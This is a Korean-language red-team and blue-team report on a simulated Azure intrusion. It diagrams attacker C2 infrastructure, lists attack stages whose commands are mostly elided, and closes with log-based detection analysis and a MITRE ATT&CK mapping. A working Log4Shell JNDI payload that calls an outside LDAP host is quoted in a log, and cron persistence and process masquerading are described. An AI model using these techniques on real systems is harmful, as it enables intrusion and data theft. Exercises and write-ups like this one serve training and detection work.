...
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)
  - [8.4. Blue Team Log Analysis](#84-blue-team-log-analysis)
  - [8.5. MITRE ATT&CK Mapping](#85-mitre-attck-mapping)
...
```mermaid
flowchart LR
    classDef attacker fill:darkred,stroke:red,stroke-width:2px,color:white;
    classDef target fill:darkgreen,stroke:lime,stroke-width:2px,color:white;
    classDef infra fill:black,stroke:gray,stroke-width:2px,color:white;

    subgraph Attacker_Zone ["🔴 공격자 영역 (Attacker Zone)"]
        direction TB
        Operator(("🕵️ Attacker<br>PC")):::attacker
        C2[("📡 C2 Server<br>(Azure VM)")]:::attacker
    end

    subgraph Target_Zone ["🛡️ 타겟 네트워크 (Azure VNet)"]
        direction TB
        LB("⚖️ Load Balancer"):::infra
        WebVM["🖥️ Target Web Server<br>(Private Subnet)"]:::target
    end
    ...
    linkStyle 2 stroke:gray,stroke-width:2px,stroke-dasharray: 5 5;
    linkStyle 3 stroke:orange,stroke-width:3px,color:orange;
    
    style Attacker_Zone fill:transparent,stroke:red,stroke-width:2px,stroke-dasharray: 5 5,color:red
    style Target_Zone fill:transparent,stroke:lime,stroke-width:2px,stroke-dasharray: 5 5,color:lime
```
...
```mermaid
flowchart LR
    classDef hacker fill:darkred,stroke:red,stroke-width:2px,color:white;
    classDef azure fill:midnightblue,stroke:dodgerblue,stroke-width:2px,color:white;
    classDef service fill:black,stroke:skyblue,stroke-width:1px,stroke-dasharray: 2 2,color:white;
    classDef victim fill:black,stroke:orange,stroke-width:2px,color:white;
    
    Operator(("🥷 Attacker PC<br>(Kali Linux)")):::hacker

    subgraph Cloud_C2 ["☁️ Attacker Infrastructure (Azure Cloud)"]
        direction TB
        C2_VM[("🖥️ Attacker C2 VM<br>(Ubuntu 22.04)")]:::azure
        
        subgraph Services ["⚙️ Running Services"]
            direction TB
            C2_Web["🌐 Nginx (80/443)<br>Payload Delivery"]:::service
            C2_LDAP["📒 Marshalsec (8888)<br>LDAP Redirector"]:::service
            C2_List["👂 Netcat (4444)<br>Reverse Shell Listener"]:::service
        end
    end
    ...
    Operator == "SSH (Encrypted)" ==> C2_VM
    C2_Web -.->|"1. Download Payload<br>(HTTPS)"| Target
    C2_LDAP -.->|"2. JNDI Lookup<br>(LDAP)"| Target
    Target ==>|"3. Reverse Connection<br>(TCP)"| C2_List
    
    linkStyle 0 stroke:red,stroke-width:3px;
    linkStyle 1 stroke:dodgerblue,stroke-width:2px;
    linkStyle 2 stroke:dodgerblue,stroke-width:2px;
    linkStyle 3 stroke:orange,stroke-width:3px,color:orange;
    
    style Cloud_C2 fill:transparent,stroke:dodgerblue,stroke-width:2px,stroke-dasharray: 5 5,color:dodgerblue
    style Services fill:transparent,stroke:skyblue,stroke-width:1px,color:skyblue
    style Victim_Network fill:transparent,stroke:orange,stroke-width:2px,stroke-dasharray: 5 5,color:orange
```
...
<strong>💥 Attack Command: Port Scan</strong>
...
<div class="callout callout-danger">
<strong>💥 Attack Command: Directory Brute-forcing</strong>
...
<div class="callout callout-danger">
<strong>💥 Attack Command: Payload Generation</strong>
...
<div class="callout callout-danger">
<strong>💥 Attack Command: Struts2 Exploit</strong>
...
<div class="callout callout-danger">
<strong>💥 Attack Command: Log4Shell Trigger</strong>
...
1.  **[Masquerading]** 악성 페이로드(`genesis.elf`)를 탐지가 어려운 시스템 경로(`/usr/local/bin/`)로 이동시키고, 이름을 정상적인 시스템 프로세스인 것처럼 **`kworker_sys`**로 변경하여 관리자의 육안 검사를 회피했다.
    ...
    <div class="callout callout-danger">
<strong>💥 Attack Command: Payload Masquerading</strong>
...
2.  **[Persistence]** 1분마다 해당 바이너리가 실행되도록 Crontab에 등록했다. 이로써 연결이 끊기더라도 최대 1분 내에 C2 세션이 복구된다.
    <div class="callout callout-danger">
<strong>💥 Attack Command: Persistence (Cron)</strong>
...
sequenceDiagram
    ...
    participant Target as "🖥️ 감염된 호스트<br>(kworker_sys)"
    participant FW as "🧱 방화벽<br>(네트워크 경계)"
    participant C2 as "📡 공격자 C2 서버<br>(hamap.shop)"

    Note over Target, C2: "🔒 암호화된 C2 통신 채널 (Port 443)"
    
    Target->>FW: "[SYN] 목적지: hamap.shop:443"
    FW->>C2: "[패킷 전달] (HTTPS는 허용됨)"
    C2-->>Target: "[SYN, ACK] 연결 요청 수락"
    
    Target->>C2: "[TLS Client Hello] (암호화 통신 요청)"
    C2-->>Target: "[TLS Server Hello + 인증서 전송]"
    
    rect rgb(45, 20, 20)
        Note right of Target: "💀 암호화 세션 연결 완료 (내용 안 보임)"
        Target->>C2: "[암호화된 상태체크(Heartbeat) 전송]"
        C2-->>Target: "[암호화된 해킹 명령(Command) 수신]"
    end
    
    Note over FW: "⚠️ 방화벽은 'HTTPS 통신 중'이라는 것만 알 수 있음<br>암호화된 내부 데이터(해킹 명령)는 볼 수 없음"
```
...
<strong>⚠️ Sensitive Information Leaked</strong>
...
<div class="callout callout-danger">
<strong>💥 Attack Command: DB Port Scan</strong>
...
1.  **[Credential Dumping]** 웹 애플리케이션 설정 파일에서 하드코딩된 DB 자격 증명을 식별했다.
    <div class="callout callout-danger">
<strong>💥 Attack Command: Credential Dumping</strong>
...
1.  **[Data Staging]** `mysqldump`를 이용해 고객 테이블 전체를 추출하고, `tar`를 이용해 압축했다.
    <div class="callout callout-danger">
<strong>💥 Attack Command: Data Exfiltration</strong>
...
### 8.4. Blue Team Log Analysis (방어 관점 분석)

공격이 성공한 후, 방어팀(Blue Team) 관점에서 로그를 분석하고 공격 징후를 식별하는 과정입니다.

<div class="callout callout-info">
<strong>🛡️ Defense Perspective: What did we miss?</strong>

만약 우리가 **Azure Sentinel**이나 **ELK Stack**을 모니터링하고 있었다면, 다음과 같은 결정적인 순간들을 포착할 수 있었을 것입니다.
</div>

#### 1. Initial Access & Delivery (Log4Shell)
*   **Log Source:** WAF / Web Server Access Log
*   **Detection:**
    ```json
    {
      "timestamp": "2025-11-21T11:05:23Z",
      "src_ip": "10.0.0.5 (Attacker)",
      "url": "/",
      "user_agent": "${jndi:ldap://hamap.shop:8888/Exploit}",
      "action": "ALLOWED (Should be BLOCKED)"
    }
    ```
*   **Analysis:** User-Agent 헤더에 포함된 `${jndi:...}` 패턴은 명백한 Log4Shell 공격 시도입니다. WAF에서 이 패턴을 차단하지 못해 페이로드가 내부로 유입되었습니다.

#### 2. C2 Channel Establishment
*   **Log Source:** Firewall / NSG Flow Logs
*   **Detection:**
    ```csv
    Time,SrcIP,DestIP,DestPort,Protocol,Action
    11:05:25,10.0.2.4 (WebVM),20.x.x.x (hamap.shop),443,TCP,Allow
    11:06:25,10.0.2.4 (WebVM),20.x.x.x (hamap.shop),443,TCP,Allow
    ```
*   **Analysis:** 내부 웹 서버(10.0.2.4)가 외부의 특정 IP(hamap.shop)로 **정확히 1분 간격**으로 접속하는 비콘(Beacon) 트래픽이 관찰됩니다. 이는 Cron Job에 의한 C2 연결 유지 행위입니다.

#### 3. Lateral Movement to DB
*   **Log Source:** Database Audit Log
*   **Detection:**
    ```sql
    -- Suspicious Full Table Dump
    SELECT * FROM customer_db.users;
    ```
*   **Analysis:** 웹 애플리케이션 계정(`admin`)으로 접속하여 `WHERE` 절 없이 전체 테이블을 조회하는 쿼리는 비정상적입니다. 이는 데이터 유출(Exfiltration)의 강력한 징후입니다.

---

### 8.5. MITRE ATT&CK Mapping

본 시뮬레이션에서 수행된 공격 기법을 MITRE ATT&CK 프레임워크에 매핑하여 정리했습니다.

| Tactic | ID | Technique | Procedure (In this Scenario) |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | T1595.001 | Active Scanning | `nmap`을 이용한 포트 스캔 및 서비스 식별 |
| **Resource Dev** | T1588.002 | Obtain Capabilities | `msfvenom`을 이용한 리버스 셸 ELF 제작 |
| **Initial Access** | T1190 | Exploit Public-Facing App | Struts2 (CVE-2017-5638) 및 Log4j (CVE-2021-44228) 악용 |
| **Execution** | T1059.004 | Command and Scripting | `bash` 셸을 통해 악성 스크립트 실행 |
| **Persistence** | T1053.003 | Scheduled Task: Cron | `/etc/crontab`에 1분마다 실행되는 백도어 등록 |
| **Defense Evasion** | T1036.005 | Masquerading | 악성 파일명을 `kworker_sys`로 위장하여 프로세스 숨김 |
| **Credential Access** | T1552.001 | Credentials in Files | `config.php` 및 환경 변수(`env`)에서 DB 패스워드 추출 |
| **Lateral Movement** | T1021.004 | SSH / Internal Connect | 웹 서버에서 내부 DB 서버(3306)로 접속 시도 |
| **Collection** | T1560 | Archive Collected Data | `tar`를 이용해 탈취한 데이터를 압축 |
| **Exfiltration** | T1041 | Exfiltration Over C2 | HTTPS 채널을 통해 압축된 데이터 외부 전송 |
